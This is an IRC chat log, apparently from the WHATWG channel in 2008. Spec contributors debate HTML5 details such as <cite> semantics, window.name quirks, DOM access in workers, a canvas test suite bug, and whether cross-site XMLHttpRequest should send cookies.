[07:28:00.0000] <zcorpan>
no directory structure?

[07:28:01.0000] <annevk>
feel free to do that for your tests

[07:29:00.0000] <annevk>
i was making tests to see how I should spec stuff and needed a place to dump them

[07:35:00.0000] <zcorpan>
ok

[07:35:01.0000] <annevk>
i'm not sure if it was the right approach

[08:11:00.0000] <zcorpan>
annevk: is .ownerNode null for imported style sheets?

[08:25:00.0000] <annevk>
yes

[08:31:00.0000] <zcorpan>
thanks

[08:31:01.0000] <zcorpan>
(that was not super clear to me reading the spec)

[08:34:00.0000] <annevk>
suggestions welcome

[08:34:01.0000] <annevk>
i'm not really sure how to phrase the conformance stuff for all that yet

[08:45:00.0000] <zcorpan>
can it be null in other cases?

[08:56:00.0000] <annevk>
HTTP Link:

[08:56:01.0000] <annevk>
<meta http-equiv=link> if we're keeping that

[08:57:00.0000] <annevk>
sorry

[08:57:01.0000] <annevk>
in the <meta> case it would not be null, duh

[08:58:00.0000] <Philip`>
It wouldn't be especially equiv to HTTP if it differed in that way

[08:59:00.0000] <annevk>
it's just a name

[10:36:00.0000] <Hixie>
i tried getting an account and it failed

[10:36:01.0000] <Hixie>
if anyone has a wordpress.com account

[10:36:02.0000] <Hixie>
it would be cool to ask this guy what it is he would actually like:

[10:36:03.0000] <Hixie>
http://mrpointy.wordpress.com/2008/02/19/ding-dong-the-frame-is-dead/

[10:47:00.0000] <gsnedders>
wow. I can actually remember my user/pass combo. on just the second attempt

[10:48:00.0000] <gsnedders>
Hixie: + normal invitation to participate? :P

[10:51:00.0000] <gsnedders>
comment in moderation queue

[11:00:00.0000] <Hixie>
gsnedders: sure

[11:01:00.0000] <gsnedders>
dbaron: is there anything anywhere online about your table/desk based implementation of HTML?

[11:01:01.0000] <gsnedders>
I couldn't find anything googling for it

[11:01:02.0000] <dbaron>
no

[11:01:03.0000] <dbaron>
not that I know of, anyway

[11:02:00.0000] <gsnedders>
well, there are logs of here, but that isn't an overly convincing place to cite :)

[11:48:00.0000] <gsnedders>
Hixie: is there anything in acid3 that assures a tree DOM is being used, and not something like IE's?

[11:50:00.0000] <Hixie>
no, because html4 doesn't define how you handle the parse errors that get you a non-tree DOM

[11:53:00.0000] <gsnedders>
ergh.

[12:33:00.0000] <gsnedders>
/me looks through the X-UA-Compatible comments and sighs

[12:33:01.0000] <gsnedders>
"I code all my sites to be xhtml strict and I expect a browser to render them that way" — yes, because "xhtml strict" specifies rendering

[12:48:00.0000] <Hixie>
such comments indicate an incomplete understanding of the web, but their sentiment is well placed and i agree with it

[12:54:00.0000] <hsivonen>
Hixie: btw, did you see my results from validating the Happy Cog portfolio?

[12:55:00.0000] <Hixie>
yeah, briefly. it ended up in one of my folders.

[12:56:00.0000] <hsivonen>
ok

[14:30:00.0000] <Hixie>
Philip`: do you have any useful information on the cite="" attribute of q and blockquote elements?

[14:37:00.0000] <Philip`>
Hixie: Only that it's quite rare

[14:37:01.0000] <Philip`>
In 16K pages, I found it only on http://www.kentuckyinjurylawblog.com

[14:38:00.0000] <Philip`>
and on another 8K (at http://canvex.lazyilluminati.com/survey/2007-07-17/analyse.cgi/attr/cite ) I didn't find it at all

[14:39:00.0000] <Philip`>
http://canvex.lazyilluminati.com/survey/2007-07-17/analyse.cgi/tag/q - hmm, nobody uses <q> anyway

[14:39:01.0000] <Hixie>
so on your 16k pages, that's 100% of uses used it correctly! :-)

[14:39:02.0000] <Philip`>
http://canvex.lazyilluminati.com/survey/2007-07-17/analyse.cgi/tag/blockquote - blockquote much more popular, but very rarely any attributes

[14:41:00.0000] <Dashiva>
Smells like indentation :)

[14:41:01.0000] <Hixie>
yeah

[14:43:00.0000] <annevk>
what's that like, the smell of presentational markup?

[14:44:00.0000] <annevk>
rather good looking, but crappy food

[14:45:00.0000] <roc>
I've never used blockquote with attributes, but always for quotations. Is that so wrong?

[14:45:01.0000] <Hixie>
no, that's fine

[14:47:00.0000] <svl>
/me has cite attributes automatically created in quoted replies on a message board system he wrote.

[14:50:00.0000] <jgraham>
/me wonders if <a rel="cite"> would generally be better than @cite

[14:53:00.0000] <annevk>
how about implicit rel=cite

[14:53:01.0000] <annevk>
paragraph scoped or some such

[14:54:00.0000] <jgraham>
? In what sense implicit?

[14:55:00.0000] <annevk>
<p><a href=...>...</a> <q>...</q></p>

[14:56:00.0000] <annevk>
<a> is cite for <q>

[14:57:00.0000] <jgraham>
That seems like it could get messy fast <p>When I went to the <a href="">theatre</a>, I was reminded of the shakespeare quote <q>All the world's a stage</q></p>

[14:59:00.0000] <jgraham>
I guess <a rel=cite> doesn't work so well for replacing @cite because there's no way to attach the attribution to the quotation and it's usually the attribution that would be linked

[15:00:00.0000] <annevk>
labeledby!

[15:00:01.0000] <annevk>
or labelledby

[15:00:02.0000] <jgraham>
no comment :)

[15:01:00.0000] <Dashiva>
p contentof div

[15:01:01.0000] <annevk>
it seems both spellings are used by the accessibility community

[15:01:02.0000] <annevk>
awesome

[15:01:03.0000] <Dashiva>
Then you don't have to worry about where you place your stuff

[15:01:04.0000] <annevk>
http://www.google.com/search?q=labeledby+w3c

[15:01:05.0000] <annevk>
http://www.google.com/search?q=labelledby+w3c

[15:02:00.0000] <annevk>
aria ftw!

[15:02:01.0000] <Dashiva>
labeledby sameas labelledby

[15:03:00.0000] <jgraham>
Dashiva: Isn't contentof spelled "owns"

[15:04:00.0000] <Dashiva>
Not sure. Just offhand, I'd assume a div could own an element that wasn't part of its content.

[15:05:00.0000] <annevk>
Did you mean: pwns

[15:05:01.0000] <jgraham>
Dashiva: I think aria allows you to do <div id="a">This is my div</div><p owns="a">My div is somehow a child of this</p>

[15:05:02.0000] <jgraham>
annevk: :-)

[15:38:00.0000] <Hixie>
ok my plan is to keep cite="" basically unchanged from html4

[15:53:00.0000] <Hixie>
can anyone find a word that can be used to describe the category to which the following things belong?: a book, a paper, a song, a movie, a TV show, a painting

[15:54:00.0000] <Hixie>
...but that does not include: a person, a boat

[15:54:01.0000] <jgraham>
media?

[15:55:00.0000] <Hixie>
sadly "media" is even more overloaded that the word i've been using so far ("work")

[15:58:00.0000] <othermaciej>
"a work" is relatively accurate

[15:58:01.0000] <othermaciej>
particularly if backed by that list of examples

[15:58:02.0000] <Hixie>
yeah, that's all i could find so far

[15:58:03.0000] <Philip`>
Should it include things like plays, where it's not a written or recorded work that can be directly referenced?

[15:59:00.0000] <Hixie>
/me adds theatre productions, plays, operas, musicals to the list

[15:59:01.0000] <jgraham>
Most plays are written, no? But there are obviously other examples of oral traditions


2008-02-20
[16:08:00.0000] <bradee-oh>
other oral traditions are also "works", though a bit more loosely...

[16:09:00.0000] <mpt>
Hixie, "creative work"?

[16:10:00.0000] <othermaciej>
has Microsoft announced anything in particular about better DOM/JS support in IE8?

[16:10:01.0000] <Philip`>
Papers aren't really creative works

[16:10:02.0000] <othermaciej>
Zeldman keeps mentioning it but I don't see an official announcement or anything

[16:10:03.0000] <Hixie>
mpt: hm, that might work

[16:10:04.0000] <Hixie>
oh yeah, creative fails for things like research papers

[16:10:05.0000] <Hixie>
(cue jokes)

[16:11:00.0000] <mpt>
Why does it?

[16:11:01.0000] <Hixie>
but seriously, i think creative would help as much as it hurts here

[16:11:02.0000] <Hixie>
because people associate "creative" with art

[16:11:03.0000] <Hixie>
rather than research

[16:11:04.0000] <jgraham>
Seriously, papers are creative works

[16:11:05.0000] <mpt>
A more awkward example might be the telephone directory

[16:12:00.0000] <jgraham>
(although I agree that many people wouldn't use the term in that context, I would strongly disagree with them)

[16:16:00.0000] <Hixie>
i'll just stick to "work" with a long list of examples

[16:16:01.0000] <Hixie>
and an explicit ban on names of people or ships

[16:16:02.0000] <jgraham>
This is for the <cite> element, right?

[16:16:03.0000] <Hixie>
yep

[16:17:00.0000] <jgraham>
/me still doesn't think it's very useful

[16:17:01.0000] <Hixie>
me either

[16:17:02.0000] <Hixie>
but it's used more than <dfn>

[16:17:03.0000] <Hixie>
and you should have seen the hell that the xhtml2 wg received for trying to drop it

[16:18:00.0000] <jgraham>
Yeah, I accept that people want to use it even though doing so has no obvious benefits

[16:19:00.0000] <annevk>
that was because Mark Pilgrim actually used it for something

[16:19:01.0000] <annevk>
that's no longer the case

[16:20:00.0000] <Hixie>
i've already spoken to mark about this

[16:20:01.0000] <Hixie>
(and i'm not saying that the aforementioned wrath is a reason to keep it, i'm just mentioning it)

[16:21:00.0000] <annevk>
<cite> for ship names though?

[16:21:01.0000] <jgraham>
I guess doing something interesting with citations will have to be left to the microformats people

[16:22:00.0000] <annevk>
i guess since it renders in italic it's ok :)

[16:22:01.0000] <Hixie>
i said ship names were explicitly banned :-P

[16:22:02.0000] <Hixie>
use <i>

[16:22:03.0000] <annevk>
(which is btw one of the reasons why <cite>Anne</cite> said: <q>...</q> doesn't make much sense; "Anne" there typically wouldn't be italicized)

[16:22:04.0000] <annevk>
oops

[16:23:00.0000] <annevk>
ah, people too

[16:31:00.0000] <Hixie>
wow, i didn't realise that the first REC the w3c ever did was PNG

[16:33:00.0000] <Hixie>
i love the comment on libpng.org:

[16:33:01.0000] <Hixie>
"(By the way, despite the implications in some of CompuServe's old press releases and in occasional trade-press articles, PNG's development was not instigated by either CompuServe or the World Wide Web Consortium, nor was it led by them. Individuals from both organizations contributed to the effort, but the PNG development group exists as a separate, Internet-based entity.)"

[16:33:02.0000] <Hixie>
i wonder if we should publish something like that on the whatwg page :-P

[16:50:00.0000] <Hixie>
http://www.whatwg.org/specs/web-apps/current-work/#the-cite

[16:53:00.0000] <annevk>
"even if people call that person a piece of work" :p

[16:56:00.0000] <annevk>
i'd like HTML5 to define this: "window.name = '1'; name = '2'; w(name); w(window.name)"

[16:57:00.0000] <annevk>
there's some magic going on there

[16:57:01.0000] <Hixie>
is that the replaceable stuff?

[16:57:02.0000] <annevk>
well, it seems that some browsers are able to distinguish between window.name and name (both in the global scope)

[16:58:00.0000] <annevk>
i think that's different from replaceable, but I'm not sure

[16:59:00.0000] <Hixie>
odd

[16:59:01.0000] <annevk>
what's not odd is that sites rely on this

[16:59:02.0000] <Hixie>
when you say "browsers"

[16:59:03.0000] <Hixie>
which browsers?

[16:59:04.0000] <Hixie>
firefox doesn't seem to distinguish them

[16:59:05.0000] <annevk>
Firefox and Internet Explorer

[17:00:00.0000] <annevk>
http://software.hixie.ch/utilities/js/live-dom-viewer/?%3Cscript%3Ewindow.name%20%3D%20%271%27%3B%20name%20%3D%20%272%27%3B%20w(name)%3B%20w(window.name)%3C%2Fscript%3E

[17:00:01.0000] <Hixie>
window.name = 'a'; name = 'b'; name + ' ' + window.name; on http://software.hixie.ch/utilities/js/js-eval-window/ evaluates to "b b"

[17:00:02.0000] <annevk>
I get 2, 1 in the log

[17:00:03.0000] <Hixie>
i get 2,2

[17:01:00.0000] <Hixie>
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9b2pre) Gecko/2007112904 Minefield/3.0b2pre

[17:01:01.0000] <annevk>
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b4pre) Gecko/2008021204 Minefield/3.0b4pre

[17:01:02.0000] <Hixie>
wow, mine is old

[17:01:03.0000] <annevk>
get "b a" for yours

[17:03:00.0000] <Hixie>
ff2 gives b b/2 2 too

[17:04:00.0000] <annevk>
yeah

[17:04:01.0000] <Hixie>
ff3 nightly crashes on startup

[17:04:02.0000] <Hixie>
/me nukes his profile

[17:05:00.0000] <annevk>
heh, I even get 2 2 in IE7

[17:05:01.0000] <annevk>
maybe I'm testing this wrongly

[17:05:02.0000] <annevk>
could be that it only applies to nested browsing contexts or so, I guess :(

[17:07:00.0000] <annevk>
Hixie, btw, could you add "html" and "css" as resources to the live dom viewer?

[17:08:00.0000] <annevk>
maybe even script that does w('run') or something like that

[17:11:00.0000] <annevk>
/me -> bed

[17:12:00.0000] <Hixie>
adbded

[17:12:01.0000] <Hixie>
added even

[18:37:00.0000] <Hixie>
othermaciej: the workers idea i proposed included a DOMImplementation object, from which you can create a Document

[18:37:01.0000] <Hixie>
afk bbiab

[18:38:00.0000] <othermaciej>
Hixie: I haven't read over all the proposals closely yet, but that would indeed raise the same issue as the X part of XHR being present

[18:39:00.0000] <othermaciej>
I can see how it could be useful but at least in WebKit I think it would significantly increase the implementation complexity

[19:18:00.0000] <roc>
eek yes that would be real pain

[19:43:00.0000] <Hixie>
really?

[19:43:01.0000] <Hixie>
huh

[19:44:00.0000] <Hixie>
i would have thought you could run a DOM on a different thread without problems, what of the DOM implementation is not thread safe?

[19:49:00.0000] <roc>
depends on the implementation, but it's easy to imagine that the DOM uses global internal caches

[19:50:00.0000] <roc>
and it's not just the DOM but everything the DOM touches

[19:50:01.0000] <roc>
canvas, video, you name it

[19:51:00.0000] <Hixie>
true

[19:52:00.0000] <Hixie>
it would be sad if it was not available

[19:52:01.0000] <Hixie>
creating markup is one of the things i'd expect to happen in a worker

[19:52:02.0000] <Hixie>
even if it's not manipulating forms, videos, audio, etc.

[19:53:00.0000] <roc>
strings and innerHTML baby

[19:53:01.0000] <roc>
gotta save something for HTML6

[19:53:02.0000] <Hixie>
creating markup with strings is sub-optimal

[19:53:03.0000] <Hixie>
but maybe e4x can find a use finally :-)

[19:53:04.0000] <roc>
The JS library writers say it's actually optimal in practice :-)

[19:53:05.0000] <Hixie>
i didn't mean performance-wise

[19:53:06.0000] <Hixie>
:-)

[19:56:00.0000] <Hixie>
bbl

[01:02:00.0000] <Philip`>
http://blog.mozilla.com/rob-sayre/2008/02/19/bloaty-parts-of-the-whatwg-html5-specification-that-should-be-removed/

[01:05:00.0000] <annevk>
http://diveintomark.org/archives/2008/02/19/all-these-years

[01:06:00.0000] <krijn>
Does he know there's a <mark> element as well now? :)

[01:37:00.0000] <Dashiva>
"they’re taking away my right to cite a person"

[01:52:00.0000] <jgraham__>
Dashiva: Yeah. I managed to restrain myself from asking which set of laws guaranteed that particular right

[01:53:00.0000] <jgraham__>
/me doesn't remember it being part of the EU convention on human rights

[01:56:00.0000] <Philip`>
A right to life, a right to liberty and security, a right to freedom of thought, conscience and religion, a right to use <cite> for people's names?

[01:56:01.0000] <Philip`>
Doesn't quite fit, I think

[01:56:02.0000] <Dashiva>
Maybe it fits into the religion part

[02:07:00.0000] <annevk>
here's some more from that stuff yesterday: http://wiki.mozilla.org/Gecko:SplitWindow

[02:08:00.0000] <annevk>
i guess it's unlikely to affect the topmost browsing context

[04:05:00.0000] <Lachy>
damn, <cite> should be allowed for people's names.  How else is one expected to markup something like:  <p><cite>John Smith<cite> said <q>Hello World!</q></p> ?

[04:05:01.0000] <Lachy>
I use it all the time for people's names when I quote from blog entries.  I usually use it for both the author and the article title.

[04:06:00.0000] <Philip`>
What benefit do people get from you using it like that?

[04:07:00.0000] <Lachy>
I don't know, it's what I do

[04:08:00.0000] <Lachy>
maybe I've been using it wrongly all these years. I don't know

[04:08:01.0000] <Philip`>
So it's superstition? :-)

[04:09:00.0000] <annevk>
i did that too, but it recently learned that the convention is that those names should not be in italic and other than that there was no apparent benefit

[04:10:00.0000] <Lachy>
ok. If there's no typographical convention for people's names, then I guess I'm wrong

[04:12:00.0000] <annevk>
s/but it/but I/ ...

[04:13:00.0000] <hsivonen>
Lachy: in Finland, there's a convention in newspapers and magazines (not books) to bold the first instance of each personal name in an article

[04:13:01.0000] <hsivonen>
Lachy: clearly, not what <cite> is good for

[04:14:00.0000] <annevk>
<b>

[04:15:00.0000] <hsivonen>
yes

[04:27:00.0000] <annevk>
lol, someone wants to put advertisements on a few of my pages for inifinite time for a one-time 200 USD

[04:28:00.0000] <Lachy>
annevk, I get spam like that occasionally (though usually caught by my spam filter)

[04:28:01.0000] <annevk>
it's a serious offer

[04:28:02.0000] <hsivonen>
annevk: was the price disclosed in the initial offer? the people who want to advertise on my site never disclose the money figures up front but promise to make it worthwhile for me

[04:28:03.0000] <Lachy>
yeah, I even had some serious offers once

[04:29:00.0000] <Lachy>
It prompted me to publish my advertising policy on my site

[04:29:01.0000] <annevk>
hsivonen, oh no, I replied

[04:29:02.0000] <Lachy>
http://lachy.id.au/about/advertising

[04:29:03.0000] <annevk>
i do run advertising

[04:30:00.0000] <annevk>
but it's finite time, has limited impact on my software, has zero maintenance cost, and gives me a share that i think is acceptable

[04:30:01.0000] <Lachy>
on annevankesteren.nl?

[04:30:02.0000] <Lachy>
I've never seen any ads

[04:30:03.0000] <annevk>
it's hardly noticable

[04:31:00.0000] <annevk>
search for "beslist.nl"

[04:31:01.0000] <annevk>
(inline search)

[04:31:02.0000] <Lachy>
oh

[04:31:03.0000] <Lachy>
that's the best advertising I've seen. all sites should do that! :-)

[04:32:00.0000] <hsivonen>
hmm. seems like they are partly paying for the google juice

[04:33:00.0000] <Camaban>
google would say those links should have nofollow on them :)

[04:33:01.0000] <hsivonen>
these advertisers seem to think they are paying for google juice but aren't getting any: http://www.w3.org/Consortium/sup

[04:35:00.0000] <annevk>
hsivonen, true

[04:36:00.0000] <Camaban>
could be debated

[04:37:00.0000] <annevk>
hsivonen, heh, probably the only w3.org page with "Generic Viagra"

[04:38:00.0000] <annevk>
or maybe not, check this out: http://www.google.com/search?q=site:w3.org+viagra

[04:38:01.0000] <Camaban>
have Google stated that links on pages like that pass no link pop?

[04:38:02.0000] <Camaban>
just ebcause they are told not to follow them, doens't mean they can't take them into account for link pop

[04:39:00.0000] <hsivonen>
Camaban: IIRC, nofollow is a misnomer and means nopagerank

[04:40:00.0000] <Camaban>
well, when I first mentioned nofollow, I was on about rel=nofollow, and yes, google suggested using that to combat spam, and have since recommended it for marking up ads as well

[04:40:01.0000] <Camaban>
because they don't feel those links should pass PR

[04:41:00.0000] <Camaban>
but the robots meta tag is a bit different

[04:41:01.0000] <hsivonen>
oh

[04:41:02.0000] <hsivonen>
the W3C seems to think they aren't selling google juice, though

[04:42:00.0000] <Camaban>
heh, well it's come up in SEO circles a few timesa about the 'paid links' the W3C has on that page

[04:42:01.0000] <hsivonen>
but it's pretty obvious that those who buy placement on that page think they are buying it

[04:42:02.0000] <Camaban>
especially as it's a high authority domain

[04:43:00.0000] <annevk>
now and then i read something or hear something from these so-called SEO's and i often doubt they know what they're talking about

[04:43:01.0000] <Camaban>
toolbar suggest that particular page has a PR of 8, a link from like that is worth a fair bit :)

[04:44:00.0000] <Camaban>
annevk: there are lots of people who call themselves SEO guru's who think meta keywords still make a difference in ranking

[04:44:01.0000] <Camaban>
on the other hand, there are numerous people who do have a clue :)

[04:55:00.0000] <Camaban>
ok, having checked, it seems Matt Cutts has stated that meta nofollow does the same as rel=nofollow, so those links should indeed NOT be passing google juice

[04:56:00.0000] <Camaban>
the page is indexed, so the links can be found as part of the page, but they aren't benefiting the recipients in terms of link popularity :)

[07:59:00.0000] <zcorpan>
Philip`: ping

[08:01:00.0000] <Philip`>
http://philip.html5.org/data/cite.txt in case anyone is interested

[08:01:01.0000] <Philip`>
zcorpan: Hello

[08:02:00.0000] <Philip`>
(Is there some WYSIWYG editor that encourages people to use <cite> when they want presentational italics?)

[08:03:00.0000] <webben>
knowing the general quality of WYSIWYG editors, probably

[08:03:01.0000] <webben>
that's a lot of support for CITE meaning citation not just title of work.

[08:06:00.0000] <gsnedders>
Philip`: (nothing widely used, at least)

[08:07:00.0000] <Philip`>
/me is just wondering how <cite><font size="4"> No.. No....please, no electric shocks.</cite></font> comes about

[08:08:00.0000] <Philip`>
Actually, I guess a WYSIWYG editor usually wouldn't generate misnested tags

[08:08:01.0000] <webben>
from http://achristiancounselor.com/witness.html ?

[08:09:00.0000] <Philip`>
Yes

[08:13:00.0000] <hsivonen>
Philip`: OpenOffice.org and derivatives produce <cite> for what is labeled as Quotation in the English UI

[08:14:00.0000] <webben>
and that matches the use on that page

[08:14:01.0000] <webben>
that's not an uncommon confusion

[08:14:02.0000] <webben>
/me wonders if that's been filed as a bug

[08:14:03.0000] <Philip`>
Hmm, that doesn't match the other uses on that page

[08:15:00.0000] <hsivonen>
Quotation is Zitat is German and OOo was originally developed by a German team

[08:15:01.0000] <Philip`>
(<FONT color="#FF0000" size=4>Jesus is the same, yesterday, today and forever</FONT>. He healed then, so He heals now. <cite><b> That was as clear as a bell and simple as pie.</b></cite>)

[08:15:02.0000] <zcorpan>
Philip`: it seems that two tests in the canvas test suite have no reference image, yet. when you have compared the results, have you skipped them or set them to pass or fail?

[08:16:00.0000] <webben>
Philip`: It's possible that having inserted a quotation the author then copied and pasted to get the same formatting or something.

[08:17:00.0000] <Philip`>
zcorpan: I thought there were more than that with no reference image, but only in cases where the result is determined automatically by script and there's no need to manually compare against a reference image

[08:18:00.0000] <zcorpan>
Philip`: ok, two that i can't determinate if it's a pass or a fail, and they are missing reference images (commented as #TODO)

[08:19:00.0000] <zcorpan>
Philip`: and they never complete in the runner

[08:19:01.0000] <Philip`>
2d.imageData.put.{clamp,round}?

[08:19:02.0000] <zcorpan>
yes

[08:19:03.0000] <Philip`>
(I can't see any other TODO-commented ones)

[08:20:00.0000] <Philip`>
Those really ought to be determined pass/fail by the script

[08:20:01.0000] <zcorpan>
seems they aren't

[08:23:00.0000] <Philip`>
In any particular browser/version?

[08:23:01.0000] <Philip`>
I've not seen it fail anywhere before, and don't see why it would start

[08:25:00.0000] <zcorpan>
i'm testing with an opera build

[08:25:01.0000] <Philip`>
Oh, uh...

[08:26:00.0000] <Philip`>
Does the page's script have the "# TODO ..." line at the bottom?

[08:26:01.0000] <Philip`>
like, in JavaScript?

[08:26:02.0000] <Philip`>
where it's a syntax error

[08:26:03.0000] <Philip`>
because I had mis-indented my YAML

[08:26:04.0000] <Philip`>
and I fixed the online HTML files but not uploaded the updated source data

[08:27:00.0000] <zcorpan>
aha

[08:27:01.0000] <zcorpan>
yeah, they have # TODO

[08:28:00.0000] <Philip`>
If you're building from the YAML source, just remove two spaces before the "# TODO: c" lines and it should be happier

[08:28:01.0000] <Philip`>
I really should upload a fixed version at some point, but it takes a non-zero amount of effort...

[10:04:00.0000] <zcorpan>
i think <blockquote>...<credit>-- <a href>Ian</a></credit></blockquote> should replace <blockquote cite>

[10:05:00.0000] <zcorpan>
and <q cite> just be dropped

[10:06:00.0000] <zcorpan>
(or maybe even drop <q> completely)

[10:08:00.0000] <Lachy>
<blockquote>... <cite>Ian</cite></blockquote> is commonly used for that purpose

[10:08:01.0000] <Lachy>
though, now that's disallowed

[10:09:00.0000] <krijn>
Wasn't that <blockquote>..</blockquote><p><cite>Ian</cite></p> recently ?

[10:09:01.0000] <zcorpan>
yeah, but cite doesn't really give you the desired styling, and makes styling a bit more difficult than having a separate element

[10:09:02.0000] <zcorpan>
krijn: yeah, that also has problems with styling

[10:09:03.0000] <krijn>
Yeah

[10:12:00.0000] <krijn>
So that's what you get when you try to work with the draft now :)

[10:13:00.0000] <zcorpan>
what?

[10:13:01.0000] <krijn>
http://fronteers.nl/blog/2008/01/commissie-diplomering-zoekt-vragen - I tried following the HTML5 examples there

[10:13:02.0000] <krijn>
Almost a month ago that was how you should use <blockquote> and <cite> :)

[10:14:00.0000] <krijn>
Ow, it still is

[10:14:01.0000] <krijn>
Even though the name there isn't

[10:14:02.0000] <krijn>
Oh well

[10:39:00.0000] <zcorpan>
http://krijnhoetmer.nl/irc-logs/xhtml/20080220#l-423

[10:42:00.0000] <hsivonen>
zcorpan: what's "there"?

[11:33:00.0000] <hsivonen>
http://www.tbray.org/ongoing/When/200x/2008/02/19/Odd-Partnerships#c1203530343.647028

[12:25:00.0000] <gsnedders>
dbaron: did the table implement HTML 4.0 or HTML 4.01?

[13:34:00.0000] <Hixie>
annevk: see my mail to csswg before you change the reference :-)

[13:39:00.0000] <annevk>
thanks

[13:39:01.0000] <annevk>
I thought Mark Baker was more pragmatic

[13:39:02.0000] <annevk>
:(

[13:41:00.0000] <annevk>
and Mozilla dropping credentials in requests is also beyond me

[13:44:00.0000] <hsivonen>
annevk: dropping credentials?

[13:45:00.0000] <annevk>
they suddenly want to do what some people have been advocating, not sending cookies or authentication info

[13:45:01.0000] <annevk>
no reason has been given

[13:46:00.0000] <gavin>
where was this announced?

[13:47:00.0000] <Hixie>
/me decides not to reply to some e-mails from hsivonen and annevk about <section> where they're just responding to other e-mails on the subject without really making suggestions for the spec

[13:47:01.0000] <Hixie>
(e-mails from 2004/2005)

[13:47:02.0000] <annevk>
gavin, http://lists.w3.org/Archives/Public/public-appformats/2008Feb/0203.html

[13:47:03.0000] <annevk>
Hixie, if I don't raise questions but just give answers there's no need to either quote or reply to me

[13:48:00.0000] <Hixie>
:-)

[13:48:01.0000] <Hixie>
yeah, you and henri have both said that before iirc

[13:48:02.0000] <gavin>
annevk: http://wiki.mozilla.org/User:Sicking/Cross_Site_XHR_Review provides some rationale

[13:49:00.0000] <gavin>
the reasons appear to mostly be "it's safer in case something goes wrong"

[13:49:01.0000] <annevk>
it defeats most use cases

[13:50:00.0000] <gavin>
I'm not really familiar enough with the usecases to comment

[13:50:01.0000] <annevk>
gavin, but yeah, that's not a new reason

[13:50:02.0000] <annevk>
gavin, k

[13:50:03.0000] <Hixie>
you can already send cookies cross-site using <form>

[13:50:04.0000] <annevk>
(I read that page earlier fwiw.)

[13:50:05.0000] <Hixie>
anything that's going to go wrong is already going wrong

[13:51:00.0000] <Hixie>
the problem is only reading the data back

[13:51:01.0000] <Hixie>
under anne's fascist "no fancy headers" scheme, you can't even control the content-type!

[13:51:02.0000] <Hixie>
:-P

[13:51:03.0000] <annevk>
yeah, lets blame me :p

[13:51:04.0000] <gavin>
these would be good points to bring up with sicking, I guess

[13:51:05.0000] <gavin>
maybe you already have

[13:52:00.0000] <annevk>
Hixie, I have since made a new proposal for headers based on suggestions from Henri, but maybe I should do that again in a separate thread

[13:52:01.0000] <Hixie>
sicking doesn't sound very convinced based on that wiki page

[13:52:02.0000] <Hixie>
he even himself raises issues with not sending cookies

[13:53:00.0000] <annevk>
probably comes from someone else

[13:53:01.0000] <annevk>
/me looks at jruderman

[13:55:00.0000] <jruderman>
last tuesday, sicking and i were the only ones arguing for sending cookies. most of the others in the meeting were arguing for not sending cookies.

[13:56:00.0000] <annevk>
wow

[13:56:01.0000] <jruderman>
it's not very frequent for dan veditz and me to disagree. that was strange.

[13:56:02.0000] <jruderman>
we spent a whole hour arguing about whether cookies should be sent

[13:56:03.0000] <Hixie>
if you don't send cookies, it's basicalyl useluss

[13:56:04.0000] <Hixie>
less

[13:56:05.0000] <Hixie>
lly

[13:57:00.0000] <jruderman>
it still works for "public data" without cookies, but yeah

[13:57:01.0000] <Hixie>
cross-site xhr is not for public data

[13:57:02.0000] <Hixie>
we can already do that with <script> and json

[13:57:03.0000] <Hixie>
it's for submitting data (post, etc)

[13:58:00.0000] <hsivonen>
it seems to me that not sending cookies will lead to site having to exchange tokens and then encoding the tokens in the request URI

[13:58:01.0000] <annevk>
yeah, and all the non-GET stuff is protected by a preflight request...

[13:58:02.0000] <jruderman>
<script> and json is less safe

[13:58:03.0000] <annevk>
hsivonen, the problem with that is that the origin server shouldn't have to know the credentials

[13:58:04.0000] <Hixie>
jruderman: that _really_ isn't a concern

[13:58:05.0000] <hsivonen>
at which point the other site has the token and can use it without further participation from the user

[13:58:06.0000] <Hixie>
jruderman: to most people

[13:59:00.0000] <jruderman>
hsivonen: or worse, linkedin asking for your gmail password instead of going through the trouble of getting users to send tokens over

[13:59:01.0000] <hsivonen>
annevk: right, but that seems to be what not sending cookies will lead to

[13:59:02.0000] <Hixie>
yup

[13:59:03.0000] <annevk>
hsivonen, true, but that's what we have now

[13:59:04.0000] <annevk>
hsivonen, so not sending credentials will not give improvements basically

[14:00:00.0000] <jruderman>
there was also a bunch of discussion of getting users to opt-in to sending cookies for specific (requesting site, target site) pairs

[14:00:01.0000] <Hixie>
oh lord

[14:00:02.0000] <annevk>
i saw that

[14:00:03.0000] <Hixie>
please don't involve the user...

[14:01:00.0000] <annevk>
/me was also scared about the UI stuff he saw on the wiki

[14:01:01.0000] <jruderman>
that was the strangest part: dveditz was the one arguing for involving the user

[14:01:02.0000] <jruderman>
he's usually against asking the user questions

[14:01:03.0000] <jruderman>
and this question would be especially nonsensical

[14:01:04.0000] <jruderman>
"may firefox send your cookies for gmail to gmail when linkedin wants something?"

[14:01:05.0000] <jruderman>
"huh?"

[14:02:00.0000] <annevk>
heh

[14:02:01.0000] <Hixie>
"would you like to use another browser instead?"

[14:02:02.0000] <jruderman>
we're having the third part of the cross-site xmlhttprequest security review at 3pm california time (53 minutes from now). you guys are welcome to join.

[14:03:00.0000] <annevk>
mpt would make a funny blog post out of that one at least :)

[14:03:01.0000] <jruderman>
oh man i miss mpt

[14:04:00.0000] <jruderman>
i don't really remember what the arguments against sending cookies were, unfortunately

[14:04:01.0000] <jruderman>
i should have taken better notes

[14:04:02.0000] <jruderman>
i'm about to walk from my apartment to the mozilla office, which takes about 22 minutes

[14:05:00.0000] <jruderman>
/me peers out the window to make sure the thunderstorm from last night is gone

[14:06:00.0000] <annevk>
is there an IRC channel for the meeting?

[14:06:01.0000] <annevk>
sicking didn't mention any...

[14:10:00.0000] <jruderman>
it's an in-person / telephone conference meeting

[14:10:01.0000] <jruderman>
sometimes such meetings have irc "back-channels" for pasting URLs and complaining when you get disconnected

[14:10:02.0000] <Hixie>
anyone know of a good web page that can take a URL to a csv file and chart one of the columns as a line chart?

[14:11:00.0000] <jruderman>
there's also debate about whether <iframe> should send cookies, btw

[14:12:00.0000] <Hixie>
i'm not worried about that one

[14:12:01.0000] <Hixie>
since if you stop sending cookies with iframes, all of google will break

[14:12:02.0000] <Hixie>
and so that change would never ship

[14:12:03.0000] <jruderman>
lol k

[14:12:04.0000] <annevk>
thank god for Google

[14:13:00.0000] <annevk>
:twisted:

[14:13:01.0000] <Hixie>
/me fails to find good csv->chart webware

[14:13:02.0000] <Hixie>
i guess i'll have to do my own

[14:14:00.0000] <jruderman>
